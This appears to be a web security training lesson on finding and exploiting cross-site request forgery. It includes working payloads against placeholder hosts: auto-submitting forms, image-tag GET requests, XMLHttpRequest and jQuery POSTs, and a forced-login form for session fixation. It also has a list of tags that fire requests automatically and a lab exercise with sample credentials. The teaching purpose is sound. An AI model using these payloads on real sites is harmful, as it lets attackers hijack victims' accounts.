# Finding and exploiting CSRF vulnerabilities

* Finding and exploiting `Cross-Site Request Forgery (CSRF)` vulnerabilities involves identifying unprotected state-changing actions and leveraging weak request validation to execute unauthorized operations on behalf of authenticated users.

## Finding CSRF vulnerabilities

1. **Identify state-changing actions** within the web application that alter user data or perform important operations, such as modifying personal details, processing purchases, transferring funds, or executing any API requests that update server-side resources. These actions are potential targets for CSRF attacks.
1. **Check for unprotected forms** within the application that submit data without a CSRF token or the `SameSite` cookie attribute, as this could expose them to CSRF attacks. CSRF tokens are server-generated unique values included in form submissions to prevent unauthorized request execution. To detect these weaknesses, use a web proxy tool like Burp Suite or OWASP ZAP to **intercept and analyze HTTP requests** examining request headers, cookies, and parameters.
1. **Test to confirm the CSRF vulnerability** by crafting a malicious request within an HTML page, utilizing a `form` or `image` tag to send an unauthorized request to the application:

    ```javascript
    <form action="https://vulnerable.tbl/email/update" method="POST">
        <input type="hidden" name="email" value="attacker@attacker.tbl">
        <input type="submit" value="Submit">
    </form>
    ```

    Visiting the crafted malicious page while authenticated in the target application will trigger the CSRF attack.

1. Additionally, as part of in-depth research, leverage a vulnerability scanner for automatic CSRF detection, inspect source code if accessible, perform SAST to uncover security risks, and evaluate the effectiveness of CSRF protections by attempting bypass techniques.

## Exploiting CSRF via state-changing requests (POST requests)

* CSRF attacks using the POST method are among the most common forms of CSRF. These attacks occur when a web application fails to implement security mechanisms (i.e, implementing CSRF tokens or using the `SameSite` attribute on cookies) to protect against unauthorized requests.
* An attacker can exploit this by crafting malicious HTML content that automatically triggers a POST request as soon as the user's browser renders the page.
  * Since browsers allow automatic form submission, attackers can initiate POST requests without user interaction, as long as the victim is logged into the targeted website.
* Unlike GET-based CSRF, POST-based CSRF usually allows attackers to target endpoints that require more structured input, which are typically used for state-changing operations.
* As example, consider a scenario where a web application has a vulnerable `/email/update` endpoint that permits users to update their email address via a POST request, requiring only the `email` parameter. An attacker could craft the following HTML page to exploit this weakness:

    ```html
    <html>
        <body>
            <form action="https://vulnerable.tbl/email/update" method="POST">
                <input type="hidden" name="email" value="attacker@attacker.tbl" />
            </form>
            <script>
                document.forms[0].submit();
            </script>
        </body>
    </html>
    ```

## Exploiting CSRF via GET requests

* CSRF vulnerabilities may also be exploited via the GET HTTP method if endpoints permit state-changing operations through GET requests without proper protections.
* GET requests are typically intended for retrieving data, but if a web application uses GET for actions that modify state (e.g., changing user information or making updates), it also creates a significant security risk.
* In the following example, when the user clicks on the following link, its email will be changed to `attacker@attacker.tbl`, making the attacker gain control over the account:

    ```http
    https://vulnerable.tbl/email/update?email=attacker@attacker.tbl
    ```

  * Clicking the link while authenticated to `vulnerable.tbl` causes the browser to automatically send a GET request to the exposed endpoint.
* CSRF can also be exploited via the GET method by embedding the malicious link in an HTML element like an `<img>` tag. When the victim accesses a malicious website, the browser automatically processes the HTML and issues the GET request to the vulnerable endpoint without requiring user interaction:

    ```html
    <img src="https://vulnerable.tbl/email/update?email=attacker@attacker.tbl">
    ```

  * The request sent, containing the victim's authenticated session cookies, would trigger the state-changing operation, altering the user's email address to `attacker@attacker.tbl` without the victim's awareness or approval.
* As an example, after updating the victim’s email, the attacker could reset the password through the new email, effectively gaining complete control of the account.

## Exploiting CSRF via session fixation

* `Session fixation` is an attack where an attacker forces a user to use a predetermined session, effectively hijacking the user's session.
* In certain scenarios, a CSRF attack can be used to log a user into an account controlled by the attacker, overwriting any existing session the user may have had. This results in the user unknowingly operating under the attacker's session.
* Unlike traditional CSRF attacks that focus on unauthorized state changes, this variant manipulates user authentication, potentially leading to account hijacking, data exposure, or session-based tracking.
* The attack follows these steps:
  1. The attacker pre-creates an account (e.g., `attacker@attacker.tbl`) on the targeted vulnerable website.
  1. The attacker constructs a malicious webpage designed to force victims to log in to this account:

      ```html
      <form action="https://vulnerable.tbl/login" method="POST">
          <input type="hidden" name="email" value="attacker@attacker.tbl" />
          <input type="hidden" name="password" value="password123" />
      </form>
      <script>
          document.forms[0].submit();
      </script>
      ```

  1. When a user visits this page, their browser automatically submits the form, initiating a login request. If the server responds with:

      ```http
      Set-Cookie: sessionId=attacker_account_session_id; Secure; HttpOnly; Path=/
      ```

      The browser overwrites the victim's existing session cookie with the attacker account's session.

      > :older_man: The `Same-Origin Policy (SOP)` prevents JavaScript running in a given origin from accessing the content of a document loaded from a different origin. Technically, cross-origin requests are still possible, but JavaScript cannot read the responses. However, the browser continues to process them, including handling the `Set-Cookie` headers.

  1. Since the victim remains unaware of this manipulation, they may continue using the trusted application, believing they are still logged into their own account. However, all actions they perform are tied to the attacker's session.
* This technique is particularly dangerous in applications where users store personal information, payment details, or sensitive messages, as any data entered while under the attacker's session will be accessible to them.
* Attackers can also leverage this approach to track user interactions and harvest sensitive data, initiate fraudulent transactions using stored payment details, exploit account linking mechanisms to permanently associate the victim's actions with the attacker's controlled session.

## Common CSRF payloads

### HTML4 and HTML5 not requiring user interaction

  |HTML tags|
  |:--:|
  |```<iframe src="URL" />```,<br/> ```<script src="URL" />```,<br/> ```<input type="image" src="URL" alt="" />```,<br/> ```<embed src="URL" />```,<br/> ```<audio src="URL" />```,<br/> ```<video src="URL" />```,<br/> ```<source src="URL" />```,<br/> ```<video poster="URL" />```,<br/> ```<link rel="stylesheet" href="URL" />```,<br/> ```<object data="URL" />```,<br/> ```<body background="URL" />```,<br/> ```<div style="background:url("URL")" />```,<br/> ```<style>body { background:url("URL") } </style> />```|

### HTML and JavaScript not requiring user interaction

  ```html
  <form action="https://vulnerable.tbl/email/update" method="POST" id="CSRF" style="display: none;">
    <input name="email" value="attacker@attacker.tbl"/>
  </form>
  <script>document.getElementById("CSRF").submit()</script>
  ```

### JavaScript not requiring user interaction

  ```javascript
  <script>
    const url = "https://vulnerable.tbl/email/update";
    const params = "email=attacker@attacker.tbl";
    const CSRF = new XMLHttpRequest();
    CSRF.open("POST", url, false);
    CSRF.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    CSRF.send(params);
  </script>
  ```

  ```javascript
  $.ajax({
    type: "POST",
    url: "https://vulnerable.tbl/email/update",
    data: "email=attacker@attacker.tbl",
  });
  ```

## JavaScript-based CSRF exploitation faces additional challenges from preflight requests

* A **preflight request** is sent in the context of `Cross-Origin Resource Sharing (CORS)` when a **cross-origin request** meets certain conditions that require the browser to first verify whether the server allows the request before actually sending the main request. Specifically, a preflight request is triggered when any of the following conditions apply:

  * The request **uses HTTP methods other than** `GET`, `HEAD`, or `POST`.
  * The request **includes custom headers** or headers that are not considered "simple" (e.g., `X-Requested-With`, `Authorization`).
  * The request **sends a `Content-Type` header** with values other than `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`.

  > :older_man: A preflight request is an HTTP OPTIONS request that a browser automatically sends before making a cross-origin request that does not qualify as a simple request. It is part of the CORS mechanism and is used to determine whether the actual request is allowed by the target server.

* Preflight requests are only triggered for cross-origin `XMLHttpRequest` or `fetch()` requests, not for traditional CSRF payloads that use HTML forms.

### How preflight requests effect on CSRF exploitation

* If the server **does not include** `Access-Control-Allow-Origin` for the attacker's domain in the preflight response, the browser **blocks the actual request**. This prevents the malicious site from sending unauthorized cross-origin requests on behalf of the victim.
* Some CSRF exploits may attempt to use `PUT`, `PATCH`, or `DELETE` requests to modify sensitive user data. Since these methods **trigger a preflight request**, the attacker cannot bypass **CORS restrictions** unless the server explicitly allows the request.
* If the request requires authentication (such as session cookies or an `Authorization` header), the browser **does not include credentials by default in a preflight request**. The preflight response must explicitly include `Access-Control-Allow-Credentials: true`, which **secure applications should not allow for untrusted origins**.

## Exercise to practice :writing_hand:

* The application shown in the first tab is vulnerable to CSRF attacks, as there is no protection that prevents a malicious site forcing a logged-in user to send a request to change their email to any arbitrary address.
  * Logging into the application is available with `johndoe`'s credentials (i.e., username `johndoe` and password `EPx@z<t#934y`).
* The second tab contains a malicious website where the rendered HTML can be modified by opening the code editor through the `Open Code Editor` button and editing the `attacker-website.html` file located at `client/build/attacker-website.html`.
  * Note that no rebuild is necessary after editing the `attacker-website.html` file. However, if the rebuild button is pressed unintentionally in the code editor, once the rebuilding process is complete make sure to log in to the main application again, and re-exploit the CSRF vulnerability before clicking the `Verify Completion` button to confirm the exercise completion.
* This exercise aims to simulate the potential actions that may be carried out by a malicious user through the creation of a JavaScript payload that forces the logged-in user's email to be updated to an arbitrary address. The process requires following these steps to be completed successfully:
  1. The source code of the `attacker-website.html` file must be edited to include a `<script>` HTML tag containing a JavaScript payload that sends an HTTP request designed to change the user's email address, while keeping in mind that:
      * The request must be directed to the `/change-email` endpoint, specifically `https://<instance_id>.ontablab.io/change-email`, where `<instance_id>` represents your deployed instance ID.
      * The request must be an HTTP `POST` request that includes a parameter named `newEmail`, which will be holding the new email value (e.g., `attacker@attacker.tbl`).
      * The request must have a `Content-Type` of `application/x-www-form-urlencoded` and must be sent using an `XMLHttpRequest` object in JavaScript.
  2. After crafting the JavaScript payload and adding it to the `attacker-website.html` file, ensure that the `johndoe` user is logged into the main application, and then visit the attacker's webpage to trigger the execution of the JavaScript `<script>` code to update the `johndoe`'s email.
  3. Confirm the email modification by reviewing the `johndoe`'s profile in the main application.
* When finished, use the `Verify Completion` button to validate the successful completion of the exercise.

  @@ExerciseBox@@
